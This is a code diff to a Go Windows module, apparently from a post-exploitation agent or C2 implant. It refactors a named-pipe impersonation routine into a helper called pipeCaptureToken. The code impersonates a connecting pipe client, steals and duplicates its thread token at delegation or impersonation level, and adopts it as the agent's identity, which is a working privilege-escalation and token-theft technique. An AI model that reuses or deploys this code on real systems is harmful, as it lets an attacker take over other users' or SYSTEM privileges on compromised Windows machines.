@@ -242,71 +242,13 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	// and fail with ERROR_NO_TOKEN (1008).
 	runtime.LockOSThread()
 
-	// Client connected — impersonate
-	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
-	if ret == 0 {
-		runtime.UnlockOSThread()
-		procDisconnectNamedPipe.Call(hPipe)
-		return errorf("ImpersonateNamedPipeClient failed: %v\nThis usually means SeImpersonatePrivilege is not available.", impErr)
-	}
-
-	// Get the impersonated identity
-	clientIdentity, identErr := GetCurrentIdentity()
-	if identErr != nil {
-		clientIdentity = "unknown (token obtained but identity lookup failed)"
-	}
-
-	// Get the impersonation token from the current thread
-	var threadToken windows.Token
-	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
-	if err != nil {
-		// Try with fewer rights
-		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
-	}
-
-	if err != nil {
-		// Revert since we can't capture the token
-		procRevertToSelf.Call()
-		runtime.UnlockOSThread()
-		procDisconnectNamedPipe.Call(hPipe)
-		return errorf("Client connected as %s but failed to capture thread token: %v", clientIdentity, err)
-	}
-
-	// Duplicate the token for persistent use
-	var dupToken windows.Token
-	err = windows.DuplicateTokenEx(
-		threadToken,
-		windows.MAXIMUM_ALLOWED,
-		nil,
-		windows.SecurityDelegation,
-		windows.TokenPrimary,
-		&dupToken,
-	)
-	if err != nil {
-		// Fallback to impersonation-level token
-		err = windows.DuplicateTokenEx(
-			threadToken,
-			windows.MAXIMUM_ALLOWED,
-			nil,
-			windows.SecurityImpersonation,
-			windows.TokenImpersonation,
-			&dupToken,
-		)
-	}
-	threadToken.Close()
-
-	if err != nil {
-		procRevertToSelf.Call()
-		runtime.UnlockOSThread()
-		procDisconnectNamedPipe.Call(hPipe)
-		return errorf("Client connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err)
-	}
-
-	// Revert the named pipe impersonation, then apply via our token system
-	procRevertToSelf.Call()
+	dupToken, clientIdentity, tokenErr := pipeCaptureToken(hPipe)
 	procDisconnectNamedPipe.Call(hPipe)
+	if tokenErr != nil {
+		runtime.UnlockOSThread()
+		return errorf("Client connected but %v", tokenErr)
+	}
 
-	// Store the token in the global identity system (calls ImpersonateLoggedOnUser on this thread)
 	if setErr := SetIdentityToken(dupToken); setErr != nil {
 		runtime.UnlockOSThread()
 		windows.CloseHandle(windows.Handle(dupToken))
@@ -330,6 +272,51 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	sb.WriteString("Use 'whoami' to verify current context.\n")
 
 	return successResult(sb.String())
+}
+
+// pipeCaptureToken impersonates the named pipe client, captures and duplicates
+// the thread token, then reverts impersonation. Caller must hold LockOSThread.
+func pipeCaptureToken(hPipe uintptr) (windows.Token, string, error) {
+	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
+	if ret == 0 {
+		return 0, "", fmt.Errorf("ImpersonateNamedPipeClient failed: %v\nThis usually means SeImpersonatePrivilege is not available.", impErr)
+	}
+
+	clientIdentity, identErr := GetCurrentIdentity()
+	if identErr != nil {
+		clientIdentity = "unknown (token obtained but identity lookup failed)"
+	}
+
+	var threadToken windows.Token
+	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
+	if err != nil {
+		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
+	}
+	if err != nil {
+		procRevertToSelf.Call()
+		return 0, clientIdentity, fmt.Errorf("failed to capture thread token: %v", err)
+	}
+
+	var dupToken windows.Token
+	dupErr := windows.DuplicateTokenEx(
+		threadToken, windows.MAXIMUM_ALLOWED, nil,
+		windows.SecurityDelegation, windows.TokenPrimary, &dupToken,
+	)
+	if dupErr != nil {
+		dupErr = windows.DuplicateTokenEx(
+			threadToken, windows.MAXIMUM_ALLOWED, nil,
+			windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken,
+		)
+	}
+	threadToken.Close()
+
+	if dupErr != nil {
+		procRevertToSelf.Call()
+		return 0, clientIdentity, fmt.Errorf("DuplicateTokenEx failed: %v", dupErr)
+	}
+
+	procRevertToSelf.Call()
+	return dupToken, clientIdentity, nil
 }
 
 // checkPrivilege checks if the current process has a specific privilege
